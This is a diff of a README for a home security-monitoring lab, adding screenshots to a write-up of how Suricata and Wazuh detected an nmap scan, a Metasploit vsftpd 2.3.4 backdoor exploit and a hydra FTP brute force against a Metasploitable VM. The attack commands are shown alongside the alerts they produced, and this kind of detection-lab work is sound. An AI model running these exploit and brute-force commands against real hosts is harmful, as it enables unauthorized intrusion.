@@ -29,6 +29,7 @@ Modern SOC work isn't just "install a SIEM and watch the dashboard." It's unders
 ```
 
 All three VMs run on VirtualBox, NAT-networked on `192.168.0.0/24`.
+![Agents overview](01-agents-overview.png)
 
 | Component | Role | OS |
 |---|---|---|
@@ -48,10 +49,13 @@ Suricata needs visibility into traffic between the attacker and the target. Two 
 ```bash
 nmap -sV -A 192.168.0.138
 ```
+![Nmap scan](02-nmap-scan.png)
 
 **Detection:** Suricata's Emerging Threats ruleset flagged multiple scan-related and protocol-anomaly signatures in real time as the scan touched each open port, including traffic on Metasploitable's exposed UnrealIRCd service (`ET CHAT IRC USER command`).
 
 **Result:** 132+ IDS events generated and correctly classified under the `ids, suricata` rule groups in Wazuh's Threat Hunting view within seconds of the scan completing.
+
+![Suricata scan alerts](03-suricata-scan-alerts.png)
 
 ---
 
@@ -64,6 +68,8 @@ msf6 > set RHOSTS 192.168.0.138
 msf6 > set LHOST 192.168.0.200
 msf6 > run
 ```
+![vsftpd exploit success](04-vsftpd-exploit-success.png)
+
 
 Metasploitable's vsftpd 2.3.4 contains a backdoor triggered by a malformed FTP login string, which spawns a root shell on TCP port 6200. The exploit landed cleanly and returned a Meterpreter session as `root`.
 
@@ -77,6 +83,8 @@ Metasploitable's vsftpd 2.3.4 contains a backdoor triggered by a malformed FTP l
 "dest_ip": "192.168.0.200",
 "direction": "to_client"
 ```
+![vsftpd root alert](05-vsftpd-root-alert.png)
+
 
 **Why this matters:** this is network-layer confirmation of a successful root compromise on an asset with zero host-based logging the exact scenario the architecture was designed to handle.
 
@@ -89,6 +97,8 @@ Metasploitable's vsftpd 2.3.4 contains a backdoor triggered by a malformed FTP l
 hydra -l msfadmin -P /tmp/quicklist.txt -t 4 ftp://192.168.0.138
 ```
 
+![Hydra FTP success](06-hydra-ftp-success.png)
+
 Hydra attempted multiple FTP logins in rapid succession, correctly identifying the valid credential pair `msfadmin:msfadmin` after several failed attempts.
 
 **Detection status:** Suricata's FTP protocol parser captured every individual `USER`/`PASS` command and server response code in `eve.json` (`event_type: ftp`), confirmed present in the manager's raw event archive:
@@ -98,6 +108,7 @@ Hydra attempted multiple FTP logins in rapid succession, correctly identifying t
  "dest_port":21,"ftp":{"command":"PASS","command_data":"root",
  "completion_code":["530"],"reply":["Login incorrect."]}}
 ```
+![FTP brute force captured](07-ftp-bruteforce-captured.png)
 
 Suricata's default ruleset has no dedicated signature for FTP brute-forcing, since it's a protocol pattern rather than a known-bad string. **A custom Wazuh correlation rule was engineered to close this gap:**
 
